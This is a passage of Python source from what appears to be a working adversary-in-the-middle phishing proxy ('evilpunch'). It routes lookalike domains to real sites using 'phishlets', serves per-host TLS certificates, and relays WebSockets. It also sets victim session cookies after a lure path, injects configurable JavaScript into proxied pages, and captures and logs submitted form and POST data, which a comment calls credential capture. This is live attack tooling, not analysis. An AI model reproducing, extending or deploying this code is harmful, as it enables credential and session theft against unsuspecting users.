            debug_log(f"Creating base SSL context from {first_loaded[0]}", "INFO")
            base_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            try:
                base_context.load_cert_chain(str(first_loaded[1]), str(first_loaded[2]))
                debug_log(f"✓ Base SSL context created successfully", "INFO")
            except Exception as e:
                debug_log(f"Failed to set base cert from DB: {e}", "ERROR")
                debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
                base_context = None

    except Exception as e:
        debug_log(f"SSL DB load error: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")

    # Fallback to default files if no DB certs worked
    if base_context is None:
        debug_log("No DB certs worked, checking default cert files...", "INFO")
        if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
            debug_log(f"Default cert files found: {CERT_FILE}, {KEY_FILE}", "INFO")
            try:
                base_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                base_context.load_cert_chain(CERT_FILE, KEY_FILE)
                debug_log(f"✓ Loaded default SSL context from files", "INFO")
            except Exception as e:
                debug_log(f"SSL default cert load failed: {e}", "ERROR")
                debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
                base_context = None
        else:
            debug_log("No default cert files found", "WARN")

    debug_log(f"Final SSL contexts - Base: {'✓' if base_context else '✗'}, Per-host: {len(per_host)}", "INFO")
    debug_log("=== END LOADING SSL ===", "DEBUG")
    return base_context, per_host


def _refresh_routing_and_ssl() -> Optional[ssl.SSLContext]:
    """
    Refresh global routing table, allowed proxy hosts list, and SNI contexts.
    Returns the base SSLContext to use (may be None, in which case HTTP is used).
    """
    global _routing_table, _active_proxy_hosts, _sni_contexts

    debug_log("=== REFRESHING ROUTING AND SSL ===", "DEBUG")
    
    # Build routing from active phishlets
    debug_log("Building routing from active phishlets...", "INFO")
    routing = _build_routing_from_active_phishlets()
    
    # Get active proxy hosts
    debug_log("Getting active proxy hosts...", "INFO")
    active_hosts = set(_get_active_proxy_hosts_from_db() or _get_proxy_hosts_from_config())
    _active_proxy_hosts = sorted(active_hosts)
    debug_log(f"Active proxy hosts: {_active_proxy_hosts}", "INFO")

    # If active_hosts is non-empty, filter routing to those; allow subdomains of active hosts
    if active_hosts:
        debug_log("Filtering routing table based on active hosts...", "DEBUG")
        def _is_allowed(proxy_host: str) -> bool:
            ph = _normalize_hostname(proxy_host)
            for ah in active_hosts:
                ahn = _normalize_hostname(ah)
                if ph == ahn or ph.endswith("." + ahn):
                    return True
            return False

        original_count = len(routing)
        _routing_table = {h: t for h, t in routing.items() if _is_allowed(h)}
        filtered_count = len(_routing_table)
        debug_log(f"Filtered routing: {original_count} -> {filtered_count} entries", "INFO")
    else:
        debug_log("No active hosts specified, using all routing entries", "WARN")
        _routing_table = routing

    # Build reverse map: target_host -> proxy_host, prefer shorter proxy host (root over subdomain) if multiple
    debug_log("Building reverse routing table...", "DEBUG")
    reverse_map: Dict[str, str] = {}
    for proxy_host, target_host in _routing_table.items():
        current = reverse_map.get(target_host)
        if current is None or len(proxy_host) < len(current):
            reverse_map[target_host] = proxy_host
            debug_log(f"  {target_host} -> {proxy_host}", "DEBUG")
    
    global _reverse_routing_table
    _reverse_routing_table = reverse_map
    
    # Debug logging for routing tables
    debug_log(f"Final routing table ({len(_routing_table)} entries):", "INFO")
    for ph, th in _routing_table.items():
        debug_log(f"  {ph} -> {th}", "DEBUG")
    
    debug_log(f"Reverse routing table ({len(_reverse_routing_table)} entries):", "INFO")
    for th, ph in _reverse_routing_table.items():
        debug_log(f"  {th} -> {ph}", "DEBUG")

    # Load SSL contexts
    debug_log("Loading SSL contexts...", "INFO")
    base_ctx, per_host = _load_sni_contexts()
    _sni_contexts = per_host

    if base_ctx is not None and _sni_contexts:
        debug_log("Setting up SNI callback...", "INFO")
        # Install SNI callback to swap certs based on hostname
        def _sni_cb(ssl_sock: ssl.SSLSocket, server_name: str, initial_ctx: ssl.SSLContext):
            try:
                host = _normalize_hostname(server_name or "")
                debug_log(f"SNI callback for host: {host}", "DEBUG")
                ctx = _sni_contexts.get(host)
                if ctx is not None:
                    ssl_sock.context = ctx
                    debug_log(f"✓ Switched SSL context for {host}", "DEBUG")
                else:
                    debug_log(f"No SSL context found for {host}, using base", "DEBUG")
            except Exception as e:
                debug_log(f"SNI callback error: {e}", "ERROR")

        try:
            base_ctx.set_servername_callback(_sni_cb)
            debug_log("✓ SNI callback installed successfully", "INFO")
        except Exception as e:
            debug_log(f"Failed to set SNI callback: {e}", "ERROR")
            debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")

    # Log routing summary
    if _routing_table:
        debug_log(f"Routing summary: {len(_routing_table)} entries", "INFO")
        for ph, th in list(_routing_table.items())[:5]:
            debug_log(f"  {ph} -> {th}", "INFO")
        if len(_routing_table) > 5:
            debug_log(f"  ... {len(_routing_table) - 5} more", "INFO")
    else:
        debug_log("No routing entries from active phishlets", "WARN")

    debug_log("=== END REFRESHING ROUTING AND SSL ===", "DEBUG")
    return base_ctx


async def websocket_handler(request, target_ws_url, matching_phishlet=None):
    debug_log("=== WEBSOCKET HANDLER ===", "INFO")
    debug_log(f"Target WebSocket URL: {target_ws_url}", "DEBUG")
    
    client_ws = web.WebSocketResponse()
    await client_ws.prepare(request)
    debug_log(f"WebSocket upgrade from {request.remote} -> {target_ws_url}", "INFO")
    
    # Replace proxy host with target host in outgoing headers
    client_host = _normalize_hostname(request.headers.get("Host", PROXY_HOST))
    upstream_host = urlparse(target_ws_url).hostname or ""
    debug_log(f"Client host: {client_host}, Upstream host: {upstream_host}", "DEBUG")
    
    # For WebSocket, we don't have phishlet data, so use simple replacement
    forward_headers = patch_headers_out(request.headers, client_host, upstream_host)
    debug_log(f"Patched headers: {forward_headers}", "DEBUG")

    try:
        debug_log("Creating client session for WebSocket", "DEBUG")
        
        # Get proxy configuration from phishlet if available
        proxy_config = matching_phishlet.get('proxy') if matching_phishlet else None
        if proxy_config:
            debug_log(f"WebSocket using proxy configuration: {proxy_config['type']}://{proxy_config['host']}:{proxy_config['port']}", "INFO")
        else:
            debug_log("WebSocket using direct connection (no proxy configured)", "DEBUG")
        
        async with create_proxy_session(proxy_config) as session:
            debug_log("Connecting to upstream WebSocket", "DEBUG")
            # Prepare WebSocket connection parameters
            ws_kwargs = {
                'url': target_ws_url,
                'headers': forward_headers,
                'ssl': False,
            }
            
            # Add proxy configuration if available
            if proxy_config and proxy_config['type'] in ['http', 'https']:
                # For aiohttp, we need to use the proxy URL format
                proxy_url = proxy_config['url']
                ws_kwargs['proxy'] = proxy_url
                debug_log(f"Adding proxy to WebSocket connection: {proxy_url}", "DEBUG")
                debug_log(f"Full WebSocket kwargs: {ws_kwargs}", "DEBUG")
                
                # Also add proxy_auth if username/password are provided
                if proxy_config.get('username') and proxy_config.get('password'):
                    from aiohttp import BasicAuth
                    ws_kwargs['proxy_auth'] = BasicAuth(
                        proxy_config['username'], 
                        proxy_config['password']
                    )
                    debug_log(f"Added proxy authentication for user: {proxy_config['username']}", "DEBUG")
            else:
                debug_log("No proxy configuration available for WebSocket connection", "DEBUG")
            
            async with session.ws_connect(**ws_kwargs) as server_ws:
                if proxy_config:
                    debug_log(f"✅ WebSocket connected through proxy: {proxy_config['url']}", "INFO")
                else:
                    debug_log("✅ WebSocket connected directly (no proxy)", "INFO")
                debug_log("✓ Upstream WebSocket connected", "INFO")

                async def client_to_server():
                    debug_log("Starting client->server WebSocket forwarding", "DEBUG")
                    msg_count = 0
                    try:
                        async for msg in client_ws:
                            msg_count += 1
                            if msg_count % 100 == 0:  # Log every 100th message
                                debug_log(f"Client->Server: processed {msg_count} messages", "DEBUG")
                                
                            if msg.type == WSMsgType.TEXT:
                                await server_ws.send_str(msg.data)
                            elif msg.type == WSMsgType.BINARY:
                                await server_ws.send_bytes(msg.data)
                            elif msg.type == WSMsgType.CLOSE:
                                debug_log("Client sent CLOSE message", "DEBUG")
                                await server_ws.close()
                                break
                    except Exception as e:
                        debug_log(f"Client->Server error: {e}", "ERROR")
                        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
                    finally:
                        debug_log(f"Client->Server forwarding ended after {msg_count} messages", "INFO")

                async def server_to_client():
                    debug_log("Starting server->client WebSocket forwarding", "DEBUG")
                    msg_count = 0
                    try:
                        async for msg in server_ws:
                            msg_count += 1
                            if msg_count % 100 == 0:  # Log every 100th message
                                debug_log(f"Server->Client: processed {msg_count} messages", "DEBUG")
                                
                            if msg.type == WSMsgType.TEXT:
                                await client_ws.send_str(msg.data)
                            elif msg.type == WSMsgType.BINARY:
                                await client_ws.send_bytes(msg.data)
                            elif msg.type == WSMsgType.CLOSE:
                                debug_log("Server sent CLOSE message", "DEBUG")
                                await client_ws.close()
                                break
                    except Exception as e:
                        debug_log(f"Server->Client error: {e}", "ERROR")
                        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
                    finally:
                        debug_log(f"Server->Client forwarding ended after {msg_count} messages", "INFO")

                debug_log("Starting bidirectional WebSocket forwarding", "INFO")
                await asyncio.gather(client_to_server(), server_to_client())
                debug_log("WebSocket forwarding complete", "INFO")

    except Exception as e:
        debug_log(f"WebSocket proxy error: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
        if not client_ws.closed:
            await client_ws.close()

    debug_log("=== WEBSOCKET HANDLER END ===", "DEBUG")
    return client_ws


async def temp_js_handler(request):
    """
    Handler for temporary JavaScript endpoints.
    Serves JavaScript code from the _temp_js_endpoints dictionary.
    """
    endpoint_id = request.match_info.get('endpoint_id')
    if not endpoint_id:
        return web.Response(text="Invalid endpoint", status=400)
    
    # Debug: Show comprehensive request information
    debug_log(f"🔍 JS endpoint request: {endpoint_id}", "INFO")
    debug_log(f"🔍 Request method: {request.method}", "DEBUG")
    debug_log(f"🔍 Request URL: {request.url}", "DEBUG")
    debug_log(f"🔍 Request path: {request.path}", "DEBUG")
    debug_log(f"🔍 Request headers: {dict(request.headers)}", "DEBUG")
    debug_log(f"🔍 Client IP: {get_client_ip(request)}", "DEBUG")
    debug_log(f"🔍 Available endpoints: {list(_temp_js_endpoints.keys())}", "DEBUG")
    debug_log(f"🔍 Total endpoints stored: {len(_temp_js_endpoints)}", "DEBUG")
    
    # Add a test endpoint for debugging
    if endpoint_id == "test":
        debug_log(f"🧪 Test endpoint requested", "INFO")
        return web.Response(
            text="console.log('Test endpoint working!'); alert('Test endpoint accessible!');",
            headers={'Content-Type': 'application/javascript; charset=utf-8'}
        )
    
    # Handle OPTIONS request (CORS preflight)
    if request.method == 'OPTIONS':
        debug_log(f"🔄 CORS preflight request for endpoint: {endpoint_id}", "DEBUG")
        headers = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Max-Age': '86400'  # 24 hours
        }
        return web.Response(headers=headers)
    
    js_code = _temp_js_endpoints.get(endpoint_id)
    if not js_code:
        debug_log(f"❌ JavaScript not found for endpoint: {endpoint_id}", "WARN")
        debug_log(f"❌ All available endpoints: {list(_temp_js_endpoints.keys())}", "DEBUG")
        return web.Response(text="JavaScript not found", status=404)
    
    debug_log(f"✅ Serving JavaScript from endpoint: {endpoint_id}", "INFO")
    debug_log(f"✅ JavaScript code length: {len(js_code)} characters", "DEBUG")
    debug_log(f"✅ JavaScript code preview: {js_code[:100]}{'...' if len(js_code) > 100 else ''}", "DEBUG")
    
    # Set appropriate headers for JavaScript
    headers = {
        'Content-Type': 'application/javascript; charset=utf-8',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Access-Control-Allow-Origin': '*',  # Allow cross-origin requests
        'Access-Control-Allow-Methods': 'GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
    }
    
    debug_log(f"✅ Response headers: {headers}", "DEBUG")
    debug_log(f"✅ Response status: 200 OK", "DEBUG")
    debug_log(f"✅ Response body length: {len(js_code)}", "DEBUG")
    
    return web.Response(text=js_code, headers=headers)


async def cache_stats_handler(request):
    """
    Handler for cache statistics endpoint.
    Returns JSON with cache statistics.
    """
    try:
        stats = get_cache_stats()
        return web.json_response(stats)
    except Exception as e:
        debug_log(f"Error getting cache stats: {e}", "ERROR")
        return web.json_response({"error": str(e)}, status=500)

async def cache_directory_handler(request):
    """
    Handler for cache directory information endpoint.
    Returns JSON with detailed cache directory structure.
    """
    try:
        directory_info = get_cache_directory_info()
        return web.json_response(directory_info)
    except Exception as e:
        debug_log(f"Error getting cache directory info: {e}", "ERROR")
        return web.json_response({"error": str(e)}, status=500)

async def cache_config_handler(request):
    """
    Handler for cache configuration endpoint.
    Returns JSON with cache configuration.
    """
    try:
        config = get_cache_config()
        return web.json_response(config)
    except Exception as e:
        debug_log(f"Error getting cache config: {e}", "ERROR")
        return web.json_response({"error": str(e)}, status=500)

async def cache_clear_handler(request):
    """
    Handler for clearing all cache.
    Returns JSON with operation result.
    """
    try:
        debug_log("Cache clear requested", "INFO")
        
        # Clear all cache files
        cleared_count = 0
        total_size_cleared = 0
        
        for phishlet_dir in Path(CACHE_FOLDER).iterdir():
            if phishlet_dir.is_dir():
                for cache_file in phishlet_dir.iterdir():
                    if cache_file.is_file():
                        try:
                            if cache_file.suffix == '.meta':
                                # Get file size before deletion for stats
                                try:
                                    metadata = _get_cache_metadata(cache_file)
                                    if metadata:
                                        total_size_cleared += metadata.get('file_size', 0)
                                except:
                                    pass
                            
                            cache_file.unlink()
                            cleared_count += 1
                        except Exception as e:
                            debug_log(f"Error removing cache file {cache_file}: {e}", "DEBUG")
        
        # Reset cache statistics
        global _cache_stats
        _cache_stats = {
            "hits": 0,
            "misses": 0,
            "writes": 0,
            "total_size_bytes": 0
        }
        
        debug_log(f"Cache cleared: {cleared_count} files, {total_size_cleared / (1024*1024):.2f}MB freed", "INFO")
        
        return web.json_response({
            "success": True,
            "message": f"Cache cleared: {cleared_count} files, {total_size_cleared / (1024*1024):.2f}MB freed",
            "cleared_files": cleared_count,
            "size_freed_mb": round(total_size_cleared / (1024*1024), 2)
        })
        
    except Exception as e:
        debug_log(f"Error clearing cache: {e}", "ERROR")
        return web.json_response({"error": str(e)}, status=500)

async def cache_cleanup_handler(request):
    """
    Handler for manual cache cleanup.
    Returns JSON with operation result.
    """
    try:
        debug_log("Manual cache cleanup requested", "INFO")
        
        # Run cleanup
        await asyncio.to_thread(_cleanup_cache)
        
        # Get updated stats
        stats = get_cache_stats()
        
        return web.json_response({
            "success": True,
            "message": "Cache cleanup completed",
            "stats": stats
        })
        
    except Exception as e:
        debug_log(f"Error in manual cache cleanup: {e}", "ERROR")
        return web.json_response({"error": str(e)}, status=500)

async def multiprocessing_stats_handler(request):
    """
    Handler for multiprocessing statistics endpoint.
    Returns JSON with multiprocessing statistics.
    """
    try:
        stats = get_multiprocessing_stats()
        return web.json_response(stats)
    except Exception as e:
        debug_log(f"Error getting multiprocessing stats: {e}", "ERROR")
        return web.json_response({"error": str(e)}, status=500)

async def proxy_handler(request):
    debug_log("-----------🐚🐚🐚🐚🐚 request started 🐚🐚🐚🐚🐚--------", "INFO")
    debug_log("=== PROXY REQUEST HANDLER ===", "DEBUG")
    debug_log(f"Request method: {request.method}", "DEBUG")
    # Limit URL logging to first 20 characters to reduce noise
    url_preview = str(request.url)[:20] + "..." if len(str(request.url)) > 20 else str(request.url)
    debug_log(f"Request URL: {url_preview}", "DEBUG")
    # debug_log(f"Request headers: {dict(request.headers)}", "DEBUG")  # Commented out to reduce noise
    
    # Call puppet hook for request and wait for completion
    await puppet_onrequest(request)
    
    # Debug: Check if this is a static file request
    url_path = str(request.rel_url)
    static_extensions = ['.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.woff', '.woff2', '.ttf', '.eot', '.webp', '.mp4', '.mp3', '.pdf', '.zip', '.rar', '.tar', '.gz']
    is_static_file = any(url_path.lower().endswith(ext) for ext in static_extensions)
    
    if is_static_file:
        debug_log(f"🔍 STATIC FILE DETECTED: {url_path}", "INFO")
        debug_log(f"   File type: {url_path.split('.')[-1].upper() if '.' in url_path else 'Unknown'}", "INFO")
        debug_log(f"   Request method: {request.method}", "INFO")
        # debug_log(f"   User-Agent: {request.headers.get('User-Agent', 'N/A')}", "DEBUG")  # Commented out to reduce noise
        # debug_log(f"   Accept: {request.headers.get('Accept', 'N/A')}", "DEBUG")  # Commented out to reduce noise
        # debug_log(f"   Referer: {request.headers.get('Referer', 'N/A')}", "DEBUG")  # Commented out to reduce noise
    else:
        debug_log(f"📄 HTML/DYNAMIC CONTENT: {url_path}", "DEBUG")
    
    incoming_host = _normalize_hostname(request.headers.get("Host", PROXY_HOST))
    debug_log(f"Incoming host: '{incoming_host}'", "INFO")
    
    # Debug: Show which phishlet this request is using
    matching_phishlet = None  # Ensure defined even if an error occurs before assignment
    try:
        # Use thread executor to handle Django model operations
        import asyncio
        
        async def get_phishlet_info():
            # Run Django operations in a thread to avoid async context issues
            def _get_phishlet_data():
                from .models import Phishlet  # type: ignore
                active_phishlets = Phishlet.objects.filter(is_active=True)
                
                for phishlet in active_phishlets:
                    data = phishlet.data if isinstance(phishlet.data, dict) else {}
                    proxy_domain = str(data.get("proxy_domain", "")).strip().lower()
                    hosts_list = data.get("hosts_to_proxy") or []
                    
                    if not proxy_domain or not isinstance(hosts_list, list):
                        continue
                        
                    for entry in hosts_list:
                        if not isinstance(entry, dict):
                            continue
                            
                        proxy_sub_raw = entry.get("proxy_subdomain")
                        if not (isinstance(proxy_sub_raw, str) and proxy_sub_raw.strip()):
                            proxy_sub_raw = entry.get("original_subdomain") or entry.get("orignal_subdomain") or ""
                        proxy_sub = str(proxy_sub_raw or "").strip().lower()
                        
                        proxy_host = proxy_domain if not proxy_sub else f"{proxy_sub}.{proxy_domain}"
                        # Check if incoming_host matches the proxy_host (including subdomain)
                        if incoming_host == proxy_host or incoming_host.endswith('.' + proxy_domain):
                            # Get proxy configuration if available
                            proxy_config = None
                            if hasattr(phishlet, 'proxy') and phishlet.proxy:
                                # For aiohttp, the proxy URL should not include authentication
                                # Authentication is handled separately via proxy_auth
                                proxy_url = f"{phishlet.proxy.proxy_type}://{phishlet.proxy.host}:{phishlet.proxy.port}"
                                proxy_config = {
                                    'type': phishlet.proxy.proxy_type,
                                    'host': phishlet.proxy.host,
                                    'port': phishlet.proxy.port,
                                    'username': phishlet.proxy.username,
                                    'password': phishlet.proxy.password,
                                    'url': proxy_url
                                }
                                debug_log(f"Created proxy config: {proxy_url} (auth: {phishlet.proxy.username}:***)", "DEBUG")
                            
                            return {
                                'id': phishlet.id,
                                'name': getattr(phishlet, 'name', 'N/A'),
                                'proxy_domain': proxy_domain,
                                'target_url': data.get('target_url', 'N/A'),
                                'proxy_auth': getattr(phishlet, 'proxy_auth', ''),  # Include proxy_auth from model
                                'proxy': proxy_config,  # Include proxy configuration
                                'is_cache_enabled': getattr(phishlet, 'is_cache_enabled', True),  # Include cache setting
                                'data': data, # Include the full data for replacement logic
                                'redirector': phishlet.redirector.data if phishlet.redirector else None  # Include redirector HTML data
                            }
                
                return None
            
            # Run in thread executor to avoid Django async issues
            loop = asyncio.get_running_loop()
            return await loop.run_in_executor(None, _get_phishlet_data)
        
        # Get phishlet info asynchronously
        matching_phishlet = await get_phishlet_info()
        
        if matching_phishlet:
            debug_log(f"=== PHISHLET INFO ===", "INFO")
            debug_log(f"Phishlet ID: {matching_phishlet['id']}", "INFO")
            debug_log(f"Phishlet name: {matching_phishlet['name']}", "INFO")
            debug_log(f"Proxy domain: {matching_phishlet['proxy_domain']}", "INFO")
            debug_log(f"Target URL: {matching_phishlet['target_url']}", "INFO")
            
            # Log proxy configuration if available
            if matching_phishlet.get('proxy'):
                proxy_info = matching_phishlet['proxy']
                debug_log(f"Proxy configuration: {proxy_info['type']}://{proxy_info['host']}:{proxy_info['port']}", "INFO")
                if proxy_info.get('username'):
                    debug_log(f"Proxy auth: {proxy_info['username']}:***", "INFO")
            else:
                debug_log("No proxy configuration found", "INFO")
            
            # Log cache configuration
            cache_enabled = matching_phishlet.get('is_cache_enabled', True)
            debug_log(f"Cache enabled: {cache_enabled}", "INFO")
            
            # debug_log(f"Hosts to proxy: {matching_phishlet['hosts_to_proxy']}", "DEBUG")  # Commented out to reduce noise
            debug_log(f"=== END PHISHLET INFO ===", "INFO")
            
            # === SESSION MANAGEMENT ===
            try:
                # Get or create session for this visitor on this phishlet+domain
                session_cookie = await get_or_create_session(
                    request, 
                    matching_phishlet['id'], 
                    matching_phishlet['proxy_domain']
                )
                
                if session_cookie:
                    debug_log(f"Session cookie: {session_cookie[:8]}...", "DEBUG")
                    
                    # Check if this is a new session (user just authenticated via proxy_auth path)
                    url_path = str(request.rel_url)
                    proxy_auth_path = matching_phishlet.get('proxy_auth', '')
                    
                    # If we're on the proxy_auth path and have a session, this is likely a new session
                    # that should redirect to the landing_url
                    if url_path == proxy_auth_path:
                        landing_url = matching_phishlet.get('data', {}).get('landing_url', '/')
                        debug_log(f"New session detected on proxy_auth path, redirecting to landing_url: {landing_url}", "WARN")
                        
                        # Handle both relative and absolute URLs
                        if landing_url.startswith('http'):
                            # Absolute URL - extract the path part
                            from urllib.parse import urlparse
                            parsed_url = urlparse(landing_url)
                            redirect_path = parsed_url.path
                            if parsed_url.query:
                                redirect_path += '?' + parsed_url.query
                            debug_log(f"Converted absolute URL '{landing_url}' to path '{redirect_path}'", "WARN")
                        else:
                            # Relative URL - use as is
                            redirect_path = landing_url
                        
                        # check if phishlet.redirector is set
                        redirector = matching_phishlet.get('redirector', '')
                        if not redirector:
                            debug_log(f"No redirector found, creating 302 redirect response with session cookie", "WARN")
                            # Create 302 redirect response with session cookie
                            response = web.HTTPFound(redirect_path)
                        else:
                            debug_log(f"Created response with 200 status code and html page data from phishlet.redirector.data", "WARN")
                            # replace in html body 
                            redirector = redirector.replace('{landing_url}', redirect_path)
                            response = web.Response(text=redirector, status=200, content_type='text/html')
                            debug_log(f"Created response with 200 status code and html page data from phishlet.redirector.data", "WARN")
                        
                        # Set cookie domain to base domain for cross-subdomain access
                        # Extract base domain from proxy_domain (e.g., 'xx.in' from 'xxtt.xx.in')
                        base_domain = matching_phishlet['proxy_domain']
                        if '.' in base_domain:
                            # For subdomains, use the base domain
                            base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
                        
                        response.set_cookie(
                            f'evilpunch_session_{matching_phishlet["id"]}', 
                            session_cookie,
                            max_age=3600*24*30,  # 30 days
                            httponly=True,
                            secure=False,  # Set to True if using HTTPS
                            samesite='Lax',
                            domain=f'.{base_domain}'  # Set to base domain for cross-subdomain access
                        )
                        
                        return response
                    
                    # # Capture cookies from the request
                    # await capture_cookies(request, session_cookie, matching_phishlet['id'], matching_phishlet['proxy_domain'])
                    
                    # Apply GET/POST force rules as configured
                    await force_get_data(request, matching_phishlet['id'])
                    # Capture form data if this is a POST request
                    await capture_form_data(request, session_cookie, matching_phishlet['id'], matching_phishlet['proxy_domain'])
                    await force_post_data(request, matching_phishlet['id'])
                    # if request is post print body
                    # ...existing code...
                    if request.method == 'POST':
                        try:
                            request_data = request.get('_body') if request.get('_body') else await request.read()
                            content_type = request.headers.get('Content-Type', '').lower()
                            import urllib.parse, json
                            if 'application/x-www-form-urlencoded' in content_type:
                                parsed = dict(urllib.parse.parse_qsl(request_data.decode('utf-8')))
                            elif 'application/json' in content_type:
                                parsed = json.loads(request_data.decode('utf-8'))
                            else:
                                parsed = request_data.decode('utf-8', errors='replace')
                            debug_log(f"XXX POST data: {parsed}", "DEBUG")
                        except Exception as e:
                            debug_log(f"Error reading POST data: {e}", "ERROR")
                    # ...existing code...
                    # check contet lent and update hader acordingly
                    content_length = request.headers.get('Content-Length')
                    if content_length:
                        try:
                            content_length_int = int(content_length)
                            if content_length_int > 0:
                                forward_headers = dict(request.headers)
                                forward_headers['Content-Length'] = str(content_length_int)
                                debug_log(f"Updated Content-Length header to {content_length_int}", "DEBUG")
                                # Use forward_headers when sending the request upstream
                        except ValueError:
                            debug_log(f"Invalid Content-Length header value: {content_length}", "WARN")
                    # Store session info for later use in response
                    request['session_cookie'] = session_cookie
                    request['phishlet_id'] = matching_phishlet['id']
                    request['proxy_domain'] = matching_phishlet['proxy_domain']
                else:
                    debug_log("No session cookie found, checking proxy_auth path", "DEBUG")
                    # Check if this is a proxy_auth path access
                    url_path = str(request.rel_url)
                    proxy_auth_path = matching_phishlet.get('proxy_auth', '')
                    
                    if not proxy_auth_path:
                        debug_log("No proxy_auth path configured, denying access", "WARN")
                        return web.Response(text="Access Denied - No proxy_auth path configured", status=403)
                    
                    if url_path != proxy_auth_path:
                        debug_log(f"Access denied: {url_path} != {proxy_auth_path} (proxy_auth path)", "WARN")
                        return web.Response(text="Access Denied - Authentication required", status=403)
                    
                    debug_log(f"Accessing proxy_auth path: {url_path}, allowing access", "INFO")
                    
            except Exception as e:
                debug_log(f"Error in session management: {e}", "ERROR")
                debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
                return web.Response(text="Internal Server Error", status=500)
            # === END SESSION MANAGEMENT ===
            
            # === JAVASCRIPT INJECTION ===
            if matching_phishlet and matching_phishlet.get('data'):
                debug_log("=== JAVASCRIPT INJECTION SECTION ===", "INFO")
                phishlet_data = matching_phishlet['data']
                
                # Check if JavaScript injection should happen for this request
                js_matches = _check_js_injection_match(phishlet_data, incoming_host, url_path)
                debug_log(f"🎯 JS injection check: {len(js_matches)} matches found", "INFO")
                
                if js_matches:
                    debug_log(f"✅ JavaScript injection triggered for {len(js_matches)} rules", "INFO")
                    script_endpoints = []
                    
                    for match in js_matches:
                        debug_log(f"🎯 Processing JS injection match: {match}", "DEBUG")
                        js_code = match.get('js_code', '')
                        if js_code:
                            endpoint_id = _create_temp_js_endpoint(js_code)
                            script_endpoints.append(endpoint_id)
                            debug_log(f"✅ Created JS endpoint {endpoint_id} for injection", "INFO")
                            debug_log(f"✅ JS code preview: {js_code[:100]}{'...' if len(js_code) > 100 else ''}", "DEBUG")
                        else:
                            debug_log(f"⚠️  No JS code found in match: {match}", "WARN")
                    
                    if script_endpoints:
                        request['js_script_endpoints'] = script_endpoints
                        debug_log(f"✅ Stored {len(script_endpoints)} script endpoints for injection: {script_endpoints}", "INFO")
                        debug_log(f"✅ Current _temp_js_endpoints: {list(_temp_js_endpoints.keys())}", "DEBUG")
                    else:
                        debug_log("⚠️  No script endpoints created", "WARN")
                else:
                    debug_log("⏭️  No JavaScript injection matches found", "DEBUG")
            else:
                debug_log("⏭️  JavaScript injection skipped - no matching phishlet or data", "DEBUG")
        else:
            debug_log(f"No matching phishlet found for host: {incoming_host}", "WARN")
            # Get all available proxy hosts for debugging
            async def get_all_proxy_hosts():
                def _get_all_hosts():
                    from .models import Phishlet  # type: ignore
                    active_phishlets = Phishlet.objects.filter(is_active=True)
                    all_hosts = []
                    
                    for phishlet in active_phishlets:
                        data = phishlet.data if isinstance(phishlet.data, dict) else {}
                        proxy_domain = str(data.get("proxy_domain", "")).strip().lower()
                        hosts_list = data.get("hosts_to_proxy") or []
                        if proxy_domain and isinstance(hosts_list, list):
                            for entry in hosts_list:
                                if isinstance(entry, dict):
                                    proxy_sub = entry.get("proxy_subdomain") or entry.get("original_subdomain") or entry.get("orignal_subdomain") or ""
                                    proxy_host = proxy_domain if not proxy_sub else f"{proxy_sub}.{proxy_domain}"
                                    all_hosts.append((proxy_host, phishlet.id))
                    return all_hosts
                
                loop = asyncio.get_running_loop()
                return await loop.run_in_executor(None, _get_all_hosts)
            
            all_hosts = await get_all_proxy_hosts()
            debug_log(f"Available proxy hosts in phishlets:", "DEBUG")
            for proxy_host, phishlet_id in all_hosts:
                debug_log(f"  - {proxy_host} (Phishlet ID: {phishlet_id})", "DEBUG")
            
    except Exception as e:
        debug_log(f"Error getting phishlet info: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
    
    # Resolve target host for this incoming host; if none, return 404
    target_host = _get_target_host_from_routing(incoming_host)
    debug_log(f"Target host resolved: '{target_host}'", "INFO")
    
    if not target_host:
        debug_log(f"No routing found for '{incoming_host}', returning 404", "WARN")
        debug_log(f"Available routes: {list(_routing_table.keys())}", "DEBUG")
        return web.Response(text="Not Found", status=404)

    # Handle WebSocket upgrade
    if request.headers.get("Upgrade") == "websocket" and request.headers.get("Connection") == "Upgrade":
        debug_log("WebSocket upgrade detected", "INFO")
        target_ws_url = f"wss://{target_host}{request.rel_url}"
        debug_log(f"WebSocket target URL: {target_ws_url}", "DEBUG")
        return await websocket_handler(request, target_ws_url, matching_phishlet)

    # Prepare headers and target URL for HTTP request
    debug_log("Preparing HTTP proxy request...", "DEBUG")
    # Pass phishlet data for proper reverse filter header replacement
    phishlet_data_for_headers = matching_phishlet.get('data') if matching_phishlet else None
    debug_log(f"request.headers: {request.headers}", "DEBUG")
    forward_headers = patch_headers_out(request.headers, incoming_host, target_host, phishlet_data_for_headers)
    # If force_get modified the relative URL, use that; otherwise use original
    modified_rel = request.get('_modified_rel_url')
    target_url = f"https://{target_host}{modified_rel if modified_rel else request.rel_url}"
    # debug_log(f"Target URL: {target_url}", "DEBUG")
    # debug_log(f"Forward headers: {dict(forward_headers)}", "DEBUG")

    try:
        debug_log("Initiating upstream request...", "DEBUG")
        
        # Get proxy configuration from phishlet if available
        proxy_config = matching_phishlet.get('proxy') if matching_phishlet else None
        if proxy_config:
            debug_log(f"Using proxy configuration: {proxy_config['type']}://{proxy_config['host']}:{proxy_config['port']}", "INFO")
        
        async with create_proxy_session(proxy_config) as session:
            # Use stored request body if available (from credential capture), otherwise read it
            request_data = request.get('_body') if request.get('_body') else await request.read()
            
            # Apply reverse filter to request body if enabled
